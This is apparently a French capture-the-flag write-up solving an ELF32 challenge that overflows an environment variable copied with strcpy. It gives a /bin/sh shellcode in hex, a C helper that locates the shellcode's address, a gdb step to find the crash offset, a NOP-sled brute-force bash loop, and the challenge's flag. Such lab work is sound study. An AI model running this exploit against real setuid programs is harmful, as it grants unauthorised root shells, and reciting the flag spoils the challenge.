Le programme copie les variables d'environnement via strcpy sans limiter la taille.
On va utiliser la variable PATH pour overflow sur getEnv()
Le programme necessite la variable USERNAME (on met une valeur bidon):
` export USERNAME=toto `

On va maintenant mettre un shellcode dans une variable d'environnement 
` export SHELLCODE=`printf "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"` `

On recupere son adresse via ce petit programme en C (qui tient compte du decalage fait par getEnv dans l'env)
-----------------------------
/* YOU MUST PASS THE FULL PATH IN ARGV2 */
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
void main(int ac, char **av)
{
    char *ptr = getenv(av[1]);
    ptr += (strlen(av[0]) - strlen(av[2])) * 2;
    printf("%s=%p\n", av[1], ptr);
}
-----------------------------

!!!!!!!!!!!!!!!!!!On va maintenant trouver ou injecter l'adresse de notre shellcode dans le programme (soit l'endroit ou sa segfault si on overflow)
!!!!!!!!!!!!!!!!!!` export USERNAME=`python -c 'print "a" * 2000 '` ; gdb-peda ./ch8 ; export USERNAME=toto `

On va mettre dans la variable PATH x NOP_OPERATIONS + adresse de shellcode + adresse d'injection trouvee precedemment.
On va le faire via un script utilise dans l'exercice precedent "ELF32_-_BSS_buffer_overflow" qui va incrementer le nombre de NOP_OP avant chaque essai
-----------------
#!/bin/bash
SHELLCODE_ADDR="TBD"
INJECT_ADDR="TBD"
NOP_OP=""
while [ true ]; do
    NOP_OP="\x90$NOP_OP"
    export PATH=`printf "$NOP_OP$SHELLCODE_ADDR$INJECT_ADDR"`
    /challenge/app-systeme/ch8/ch8
done
-----------------

resultat = s2$srAkdAq18q
